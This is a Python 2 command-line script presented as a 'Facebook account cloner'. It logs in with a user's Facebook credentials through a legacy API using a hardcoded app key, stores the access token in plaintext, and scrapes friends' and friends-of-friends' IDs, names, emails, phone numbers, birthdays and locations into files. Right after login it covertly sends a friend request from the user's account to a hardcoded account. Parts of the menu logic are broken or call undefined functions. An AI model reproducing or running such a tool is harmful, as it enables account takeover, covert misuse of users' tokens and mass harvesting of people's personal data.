#!/usr/bin/python2
# coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser

#-Setting-#
########
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')] 

#-exit-#
def exit():
	os.system('clear')
	print "\033[1;91m[!] Closing the tool..."
	os.system('sleep 3 && clear')
	os.system('xdg-open https://web.facebook.com/mkdirlove.git')
	os.sys.exit()
        tool_main_function()

#-Animation-#
def mkdir(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(00000.1)

##### LOGO #####
logo = """
\n\x1b[1;91m  03340002925 \n\x1b[1;95m (_____)  (_____)   (__)_(__) (_______)\n\x1b[1;92m(_)___   (_)   (_) (_) (_) (_)   (_)   \n \x1b[1;91m (___)_ (_)   (_) (_) (_) (_)   (_)   \n\x1b[1;97m  ____(_)(_)___(_) (_)     (_) __(_)__ \n\x1b[1;92m (_____)  (_____)  (_)     (_)(_______)\n \x1b[1;90m    FACEBOOK ACCOUNT CLONER BY \x1b[3;90mSOMI BRAND\x1b[0;37;40m\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\x1b[1;92m\xe2\x96\xb8 \x1b[3;95mDEVOLPER       : SOMI AWAN\n\x1b[3;92m\xe2\x96\xb8 \x1b[3;96mWHATSAPP NO   : +923455453538\n\x1b[1;92m\xe2\x96\xb8 \x1b[3;93mNOTE    : PLZ DON,T CALL ME ONLY TEXT\n\x1b[3;93m\xe2\x96\xb8 \x1b[1;94mNOTE     : USE FAST 4G SIM NET\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80
"""
# load #
def load():
	tiload = ['.   ','..  ','... ']
	for o in tiload:
		print("\r\033[1;91m[???] \033[1;92mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

##### choices Login #####
def tool_main_function():
	os.system('clear')
	print logo
	print "\033[1;0m\033[1;97m???--\033[1;91m> \033[1;92m1.\033[1;97m Normal login"
	print "\033[1;97m???--\033[1;91m> \033[1;92m2.\033[1;97m Tokens login"
	print "\033[1;97m???--\033[1;91m> \033[1;91m0.\033[1;97m Exit"
	print "\033[1;97m???"
	login_method = raw_input("\033[1;97m??????\033[1;91m>>> \033[1;97m")
	if login_method =="":
		print"\033[1;91m[!] Wrong input"
		exit()
	elif login_method =="1":
		login()
	elif login_method =="2":
		fbtoken()
	elif login_method =="0":
		exit()
	else:
		print"\033[1;91m[!] Wrong input"
		exit()

##### LOGIN #####
#================#
def login():
	os.system('clear')
	try:
		fb_token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print('\033[1;91m[???] \033[1;92mFACEBOOK LOGIN \033[1;91m[???]')
		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
		pwd = getpass.getpass('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')
		load()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;91m[!] No connection"
			exit()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				pick = open("login.txt", 'w')
				pick.write(z['access_token'])
				pick.close()
				print '\n\033[1;91m[\033[1;96m???\033[1;91m] \033[1;92mLogin successfully'
                                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91m[!] No connection"
				exit()
		if 'checkpoint' in url:
			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			exit()
		else:
			print("\n\033[1;91m[!] Login Failed")
			os.system('rm -rf login.txt')
			time.sleep(0.01)
			login()

##### TOKEN #####
def fbtoken():
	os.system('clear')
	print logo
	fb_token = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
		a = json.loads(otw.text)
		fb_name = a['name']
		pick = open("login.txt", 'w')
		pick.write(fb_token)
		pick.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			exit()
		elif e =="y":
			login()
		else:
			exit()

##### MENU ##########################################
def menu():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
		a = json.loads(otw.text)
		fb_name = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91m[!] \033[1;93mAccount Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[!] No connection"
		exit()
	os.system("reset")
	print logo
	print "???\033[1;91m[\033[1;96m???\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+fb_name+"\033[1;97m"
	print "???\033[1;91m[\033[1;96m???\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id
	print "\033[1;97m???"+40*"???"
	print "\033[1;97m???--\033[1;91m> \033[1;92m1.\033[1;97m Dump Friends ids"
	print "\033[1;97m???--\033[1;91m> \033[1;92m0.\033[1;97m Back"
	
	print "???"
	choices()
#-
def choices():
	pick = raw_input("\033[1;97m??????\033[1;91m>>> \033[1;97m")
	if pick =="":
		print "\033[1;91m[!] Wrong input"
		choices()
	elif pick =="0":
		information()
	elif pick =="2":
		dump()
	elif pick =="3":
		menu_hack()
	elif pick =="4":
		menu_bot()
	elif pick =="5":
		func()
	elif pick =="6":
		os.system('clear')
		print logo
		fb_token=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;92mYour token\033[1;91m :\033[1;97m "+fb_token
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
        elif pick =="7":
                os.system('clear')
                print logo
                print 40 * '\033[1;97m\xe2\x95\x90'
                os.system('git pull origin master')
                raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')
                menu()
	elif pick =="8":
		os.remove('out')
	elif pick =="9":
		os.system('rm -rf login.txt')
		os.system('xdg-open https://www.facebook.com/rizz.magizz')
		exit()
	elif pick =="0":
		exit()
	else:
		print "\033[1;91m[!] Wrong input"
		choices()

##### INFO #####
def information():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
	mkdir('\033[1;91m[???] \033[1;92mWait a minute \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)
	tryy = json.loads(r.text)
	for i in tryy['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+fb_token)
			z = json.loads(x.text)
			print 42*"\033[1;97m???"
			try:
				print '\033[1;91m[???] \033[1;92mName\033[1;97m          : '+z['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found'
			try:
				print '\033[1;91m[???] \033[1;92mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;97m            : \033[1;91mNot found'
			try:
				print '\033[1;91m[???] \033[1;92mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;97m         : \033[1;91mNot found'
			try:
				print '\033[1;91m[???] \033[1;92mTelephone\033[1;97m     : '+z['mobile_phone']
			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'
			try:
				print '\033[1;91m[???] \033[1;92mLocation\033[1;97m      : '+z['location']['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;97m      : \033[1;91mNot found'
			try:
				print '\033[1;91m[???] \033[1;92mDate of birth\033[1;97m : '+z['birthday']
			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'
			try:
				print '\033[1;91m[???] \033[1;92mSchool\033[1;97m        : '
				for q in z['education']:
					try:
						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
			except KeyError: pass
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu()
		else:
			pass
	else:
		print"\033[1;91m[???] User not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()

##### DUMP #####
def dump():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m???--\033[1;91m> \033[1;92m1.\033[1;97m Get ID friend"
	print "\033[1;97m???--\033[1;91m> \033[1;92m2.\033[1;97m Get ID friend from friend"
	print "\033[1;97m???--\033[1;91m> \033[1;92m3.\033[1;97m Get group member ID"
	print "\033[1;97m???--\033[1;91m> \033[1;92m4.\033[1;97m Get group member email"
	print "\033[1;97m???--\033[1;91m> \033[1;92m5.\033[1;97m Get group member phone number"
	print "\033[1;97m???--\033[1;91m> \033[1;92m6.\033[1;97m Get email friend"
	print "\033[1;97m???--\033[1;91m> \033[1;92m7.\033[1;97m Get email friend from friend"
	print "\033[1;97m???--\033[1;91m> \033[1;92m8.\033[1;97m Get a friend's phone number"
	print "\033[1;97m???--\033[1;91m> \033[1;92m9.\033[1;97m Get a friend's phone number from friend"
	print "\033[1;97m???--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "???"
	choose_dump()
#-----choices
def choose_dump():
	choose_from = raw_input("\033[1;97m??????\033[1;91m>>> \033[1;97m")
	if choose_from =="":
		print "\033[1;91m[!] Wrong input"
		choose_dump()
	elif choose_from =="1":
		friends_id()
	elif choose_from =="2":
		id_from_friends()
	elif choose_from =="3":
		id_member_group()
	elif choose_from =="4":
		em_member_group()
	elif choose_from =="5":
		no_member_group()
	elif choose_from =="6":
		email()
	elif choose_from =="7":
		email_from_friends()
	elif choose_from =="8":
		phone_number()
	elif choose_from =="9":
		phone_number_from_friends()
	elif choose_from =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		choose_dump()

##### ID friends #####
def friends_id():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		r=requests.get("https://graph.facebook.com/me/friends?access_token="+fb_token)
		z=json.loads(r.text)
		mkdir('\033[1;91m[???] \033[1;92mGet all friend id \033[1;97m...')
		print 42*"\033[1;97m???"
		make_action = open('out/friends_id.txt','w')
		for a in z['data']:
			idfriends.append(a['id'])
			make_action.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfriends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		make_action.close()
		print '\r\033[1;91m[\033[1;96m???\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfriends))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/friends_id.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[???] No connection"
		exit()

##### ID FROM FRIENDS #####
def id_from_friends():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
			op = json.loads(seat.text)
			print"\033[1;91m[\033[1;96m???\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+fb_token)
		z=json.loads(r.text)
		mkdir('\033[1;91m[???] \033[1;92mGet all friend id from friend \033[1;97m...')
		print 42*"\033[1;97m???"
		make_action = open('/sdcard/friends_id_from_friends.txt','w')
		for a in z['friends']['data']:
			idfromfriends.append(a['id']+"_"+a['name'])
			make_action.write(a['id']+"_"+a['name'] + '\n')
		make_action.close()
		print '\r\033[1;91m[\033[1;96m???\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfromfriends))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('sdcard/friends_id_from_friends.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[???] No connection"
		exit()

if __name__=='__main__':
        tool_main_function()

